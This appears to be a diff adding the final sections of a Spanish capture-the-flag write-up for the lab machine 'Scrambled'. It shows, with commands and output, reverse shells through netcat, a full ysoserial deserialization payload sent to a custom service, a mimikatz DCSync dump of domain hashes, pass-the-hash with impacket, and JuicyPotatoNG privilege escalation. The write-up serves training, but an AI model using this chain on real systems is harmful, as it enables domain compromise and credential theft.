+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\system32> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'ScrambledEggs9900' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Windows\system32> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'scrm.local\MiscSvc'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Windows\system32> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">dc1 </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">whoami</span><span class="p"> }
+scrm\miscsvc
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos devuelve el output como el usuario <code class="language-plaintext highlighter-rouge">miscsvc</code>, asi que simplemente podemos ejecutar el <code class="language-plaintext highlighter-rouge">shell.exe</code> que hemos subido antes para enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\system32> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">dc1 </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">cmd </span><span class="p">/c C:\ProgramData\shell.exe }  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo recibimos la shell como el usuario <code class="language-plaintext highlighter-rouge">miscsvc</code> donde podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.168
+Windows PowerShell running as user miscsvc on DC1
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Users\miscsvc\Documents> </span><span class="am">whoami</span><span class="p">
+scrm\miscsvc
+PS C:\Users\miscsvc\Documents> </span><span class="am">type </span><span class="p">..\Desktop\user.txt
+a19**************************e91
+PS C:\Users\miscsvc\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Enumerando el equipo en el directorio <code class="language-plaintext highlighter-rouge">C:\Shares</code> encontramos las carpetas de todos los <code class="language-plaintext highlighter-rouge">recursos</code> que se comparten por smb, aun nos falta enumerar el recurso <code class="language-plaintext highlighter-rouge">IT</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Shares> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Shares
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       01/11/2021     15:21                HR
+d-----       03/11/2021     19:32                IT
+d-----       01/11/2021     15:21                Production  
+d-----       04/11/2021     22:23                Public
+d-----       03/11/2021     19:33                Sales
+
+PS C:\Shares></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro de algunos directorio en <code class="language-plaintext highlighter-rouge">IT</code> nos encontramos con un archivo <code class="language-plaintext highlighter-rouge">exe</code> y un <code class="language-plaintext highlighter-rouge">dll</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Shares\IT\Apps\Sales Order Client> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Shares\IT\Apps\Sales Order Client
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       05/11/2021     20:52          86528 ScrambleClient.exe  
+-a----       05/11/2021     20:52          19456 ScrambleLib.dll
+
+PS C:\Shares\IT\Apps\Sales Order Client></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos a <code class="language-plaintext highlighter-rouge">IT</code> con smbclient como <code class="language-plaintext highlighter-rouge">miscsvc</code> y descargamos los archivos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local -k  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use IT
+# cd Apps\Sales Order Client
+# mget *
+[*] Downloading ScrambleClient.exe
+[*] Downloading ScrambleLib.dll
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos decompilar el binario con <code class="language-plaintext highlighter-rouge">dnspy</code> y ver su codigo base y algunas funciones</p>
+<a href="/htb/scrambled/5.png" target="_blank"><div><p><img src="/htb/scrambled/5.png"></p></div></a>
+
+<p class="plain-text">Analizemos un poco el codigo en este caso la función <code class="language-plaintext highlighter-rouge">UploadNewOrder</code> que realiza algunas validaciones, despues llama a <code class="language-plaintext highlighter-rouge">UploadOrder</code> de Client con un argumento</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">private </span><span class="no">void </span><span class="na">UploadNewOrder</span><span class="p">(</span><span class="no">object </span><span class="am">NewOrder</span><span class="p">)
+{
+	</span><span class="no">string </span><span class="p">errorMessage </span><span class="o">= </span><span class="no">string</span><span class="p">.Empty;
+	</span><span class="o">try</span><span class="p">
+	{
+		this.Client.UploadOrder((</span><span class="na">SalesOrder</span><span class="p">)NewOrder);  
+	}
+	</span><span class="o">catch </span><span class="p">(</span><span class="na">Exception </span><span class="p">ex)
+	{
+		errorMessage </span><span class="o">= </span><span class="p">ex.Message;
+	}
+	</span><span class="o">finally</span><span class="p">
+	{
+		this.UploadNewOrderFinished(errorMessage);
+	}
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Veamos que hace la función <code class="language-plaintext highlighter-rouge">UploadOrder</code>, lo interesante en este metodo es que toma el argumento que es <code class="language-plaintext highlighter-rouge">NewOrder</code> y usa <code class="language-plaintext highlighter-rouge">SerializeToBase64()</code> para serializarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public </span><span class="no">void </span><span class="na">UploadOrder</span><span class="p">(</span><span class="na">SalesOrder </span><span class="am">NewOrder</span><span class="p">)
+{
+	</span><span class="o">try</span><span class="p">
+	{
+		Log.Write(</span><span class="s">"Uploading new order with reference " </span><span class="o">+ </span><span class="p">NewOrder.ReferenceNumber);
+		</span><span class="no">string </span><span class="p">text </span><span class="o">= </span><span class="p">NewOrder.SerializeToBase64();
+		Log.Write(</span><span class="s">"Order serialized to base64: " </span><span class="o">+ </span><span class="p">text);
+		</span><span class="na">ScrambleNetResponse </span><span class="p">scrambleNetResponse </span><span class="o">= </span><span class="p">this.SendRequestAndGetResponse(</span><span class="o">new </span><span class="na">ScrambleNetRequest</span><span class="p">(ScrambleNetRequest.RequestType.UploadOrder, text));  
+		</span><span class="na">ScrambleNetResponse</span><span class="p">.</span><span class="na">ResponseType </span><span class="p">type </span><span class="o">= </span><span class="p">scrambleNetResponse.Type;
+		</span><span class="o">if </span><span class="p">(type </span><span class="o">!= </span><span class="p">ScrambleNetResponse.ResponseType.Success)
+		{
+			</span><span class="o">throw new </span><span class="na">ApplicationException</span><span class="p">(scrambleNetResponse.GetErrorDescription());
+		}
+		Log.Write(</span><span class="s">"Upload successful"</span><span class="p">);
+	}
+	</span><span class="o">catch</span><span class="p"> (</span><span class="na">Exception </span><span class="p">ex)
+	{
+		Log.Write(</span><span class="s">"Error: " </span><span class="o">+ </span><span class="p">ex.Message);
+		</span><span class="o">throw </span><span class="p">ex;
+	}
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces vamos con <code class="language-plaintext highlighter-rouge">SerializeToBase64()</code>, podemos ver que para serializar la data que recibe usa <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> que es vulnerable a un ataque de deserialización</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public </span><span class="no">string </span><span class="am">SerializeToBase64</span><span class="p">()
+{
+	</span><span class="na">BinaryFormatter </span><span class="p">binaryFormatter </span><span class="o">= new </span><span class="na">BinaryFormatter</span><span class="p">();
+	Log.Write(</span><span class="s">"Binary formatter init successful"</span><span class="p">);
+	</span><span class="no">string </span><span class="p">result;
+	</span><span class="o">using </span><span class="p">(</span><span class="na">MemoryStream </span><span class="p">memoryStream </span><span class="o">= new </span><span class="na">MemoryStream</span><span class="p">())
+	{
+		binaryFormatter.Serialize(memoryStream, this);
+		result </span><span class="o">= </span><span class="p">Convert.ToBase64String(memoryStream.ToArray());  
+	}
+	</span><span class="o">return </span><span class="p">result;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Todo esto lo corre el exe desde el puerto <code class="language-plaintext highlighter-rouge">4411</code> que esta abierto en la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public </span><span class="p">ScrambleNetClient()
+{
+	this.Server </span><span class="o">= </span><span class="no">string</span><span class="p">.Empty;  
+	this.Port </span><span class="o">= </span><span class="mi">4411</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usaremos <a href="https://github.com/pwntester/ysoserial.net">ysoserial</a> para crear una data en <code class="language-plaintext highlighter-rouge">base64</code> en el formato <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> con su respectivo <code class="language-plaintext highlighter-rouge">gadget</code>, como comando ejecutaremos el <code class="language-plaintext highlighter-rouge">shell.exe</code> de antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\CTF\ysoserial> </span><span class="am">.\ysoserial.exe </span><span class="c1">-f </span><span class="p">BinaryFormatter </span><span class="c1">-g </span><span class="p">AxHostState </span><span class="c1">-o </span><span class="p">base64 </span><span class="c1">-c </span><span class="az">"C:\ProgramData\shell.exe"</span><span class="p">
+AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAKUDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxwU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFByb2dyYW1EYXRhXHNoZWxsLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==  
+PS C:\CTF\ysoserial>}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos al puerto <code class="language-plaintext highlighter-rouge">4411</code> de la maquina donde nos recibe el programa, con <code class="language-plaintext highlighter-rouge">UPLOAD_ORDER;</code> como prefix enviamos nuestra <code class="language-plaintext highlighter-rouge">data</code> serializada que generamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">10.10.11.168 4411
+SCRAMBLECORP_ORDERS_V1.0.3;
+UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAKUDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxwU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFByb2dyYW1EYXRhXHNoZWxsLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==  
+ERROR_GENERAL;Error deserializing sales order: Unable to cast object of type 'State' to type 'ScrambleLib.SalesOrder'.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo ejecutara el <code class="language-plaintext highlighter-rouge">comando</code> que en este caso indicamos que es <code class="language-plaintext highlighter-rouge">shell.exe</code> el cual nos envia una <code class="language-plaintext highlighter-rouge">powershell</code>, en este caso lo hace como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.168
+Windows PowerShell running as user DC1$ on DC1
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+e69**************************e5e
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Solo como extra con <code class="language-plaintext highlighter-rouge">mimikatz</code> haremos un <code class="language-plaintext highlighter-rouge">dcsync</code> para dumpear los hashes del <code class="language-plaintext highlighter-rouge">ntds</code>, en este caso simplemente nos interesa el <code class="language-plaintext highlighter-rouge">NT</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\mimikatz.exe </span><span class="az">"lsadump::dcsync /domain:scrm.local /user:Administrator" </span><span class="p">exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::dcsync /domain:scrm.local /user:Administrator
+[DC] 'scrm.local' will be the domain
+[DC] 'DC1.scrm.local' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : administrator
+User Principal Name  : administrator@scrm.local
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00110200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD NOT_DELEGATED )
+Account expiration   : 
+Password last change : 08/11/2021 01:35:59
+Object Security ID   : S-1-5-21-2743207045-1827831105-2542523200-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: e2bba07a8348bca150ac6ffee6a3afbb
+    ntlm- 0: e2bba07a8348bca150ac6ffee6a3afbb
+    ntlm- 1: 62739c0397a691744ac9a84ae537e6fe
+    lm  - 0: a2a7473ec82a01b122044855a5877793
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 26b52cc4b9ce2de237d47360626de0e8
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : SCRM.LOCALadministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 36e4dac77fe883a268dae5959a54128023e108aa07b89b8b73519422316e50a8  
+      aes128_hmac       (4096) : 1eb10b3e4697f7d382b705a2b68712c3
+      des_cbc_md5       (4096) : 5dc7897ccd51378a
+    OldCredentials
+      aes256_hmac       (4096) : 3df7e04eec2c97f6cda6cc9fc51bee443f5f0dfeb13fece15d0f8a8676ddd2bb
+      aes128_hmac       (4096) : 7c4626b5e7c710b5ac3c9169f6520513
+      des_cbc_md5       (4096) : 5d830d01d91fe325
+
+* Primary:Kerberos *
+    Default Salt : SCRM.LOCALadministrator
+    Credentials
+      des_cbc_md5       : 5dc7897ccd51378a
+    OldCredentials
+      des_cbc_md5       : 5d830d01d91fe325
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  5fb3e8ea8ae045dafd90a60d67ebeeaf
+    02  f4768cf35890e2d59e23fac7593ef084
+    03  e59facc069ebc457a05feca47f98eb0b
+    04  5fb3e8ea8ae045dafd90a60d67ebeeaf
+    05  f4768cf35890e2d59e23fac7593ef084
+    06  b535495b020bfcb9950bd5616d34cfe5
+    07  5fb3e8ea8ae045dafd90a60d67ebeeaf
+    08  a6efbd3a90af39653b37619a6eb16852
+    09  a6efbd3a90af39653b37619a6eb16852
+    10  829b62e6e32fa4e321b6ebe46748cb8d
+    11  1f60d009a37571cd6d6ac2b071b52e02
+    12  a6efbd3a90af39653b37619a6eb16852
+    13  ce72f4e36a9ead63ed7a7a16309e2987
+    14  1f60d009a37571cd6d6ac2b071b52e02
+    15  9656d4e6bdaab449878da6023cddf593
+    16  9656d4e6bdaab449878da6023cddf593
+    17  534642e76ba4df972a9530abe7cdc360
+    18  e0b7df683a3c6ac0e910060d793b19d2
+    19  3e69fc3d8ee2465df2a06c25a5524ebd
+    20  ada2203946d1d6cbfe0482b70d448660
+    21  3b641ff45450f40ab16a2582079cc3de
+    22  3b641ff45450f40ab16a2582079cc3de
+    23  918e4affba8a45ab0a60d9a385e834ad
+    24  7d6325dbeb7ff7d17b070e1170a381d4
+    25  7d6325dbeb7ff7d17b070e1170a381d4
+    26  33a605a4246ba556a187b24cfc20bd1f
+    27  42735b5148aea44d4ac6f47b3f3677eb
+    28  0a238d2030221455a341d549eb227c4a
+    29  9e8ca432a4ec8eca5223f3aa0a43d58c
+
+
+mimikatz(commandline) # exit
+Bye!
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Autenticandonos con ese <code class="language-plaintext highlighter-rouge">hash</code> NT podemos solicitar un ticket con <code class="language-plaintext highlighter-rouge">getST</code> para el usuario <code class="language-plaintext highlighter-rouge">Administrador</code>, despues lo exportamos a la variable <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-getST </span><span class="p">-spn cifs/dc1.scrm.local scrm.local/Administrator@dc1.scrm.local -hashes :e2bba07a8348bca150ac6ffee6a3afbb -dc-ip dc1.scrm.local  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Getting ST for user
+[*] Saving ticket in Administrator@dc1.scrm.local.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator@dc1.scrm.local.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Utilizando el <code class="language-plaintext highlighter-rouge">ticket</code> ccache para autenticarnos por <code class="language-plaintext highlighter-rouge">kerberos</code> podemos obbtener una shell en el <code class="language-plaintext highlighter-rouge">DC</code> omo <code class="language-plaintext highlighter-rouge">Administrator</code> con <code class="language-plaintext highlighter-rouge">psexec</code> o <code class="language-plaintext highlighter-rouge">wmiexec</code>, leemos la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">scrm.local/Administrator@dc1.scrm.local -k -no-pass -shell-type powershell  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+scrm\administrator
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+e69**************************e5e
+PS C:\></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="altern-administrator">
+<br><h3 class="post-title">Alternativa - Administrator</h3><br>
+
+<p class="plain-text">Una via no intencionada es desde <code class="language-plaintext highlighter-rouge">mssql</code> utilizar <a href="https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/">bulkcolumn</a> para leer archivos, este lo hace bajo los privilegios de <code class="language-plaintext highlighter-rouge">Administrator</code> y nos permite leer la <code class="language-plaintext highlighter-rouge">root.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select bulkcolumn from openrowset(bulk 'C:\Users\Administrator\Desktop\root.txt', single_clob) flag  
+
+bulkcolumn
+---------------------------------------------------------
+
+b'e69**************************e5e\r\n'
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando los <code class="language-plaintext highlighter-rouge">privilegios</code> desde la shell del usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code> podemos ver que tiene el privilegio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> que nos permite <code class="language-plaintext highlighter-rouge">suplantar</code> a un usuario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\system32> </span><span class="am">whoami </span><span class="p">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========  
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente usar <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a> para ejecutar el archivo <code class="language-plaintext highlighter-rouge">shell.exe</code> que subimos antes el cual nos enviara una powershell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\JuicyPotatoNG.exe </span><span class="c1">-t </span><span class="p">* </span><span class="c1">-p</span><span class="p"> shell.exe
+
+         JuicyPotatoNG
+         by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation  
+[+] CreateProcessAsUser OK
+[+] Exploit successful!
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.168
+Windows PowerShell running as user DC1$ on DC1
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+e69**************************e5e
+PS C:\></span>
+</code></pre></div></div><br>
+
 </section>
 
 </article>
@@ -202,4 +880,3 @@ PORT     STATE SERVICE
     </div>
   </body>
 </html>
--->
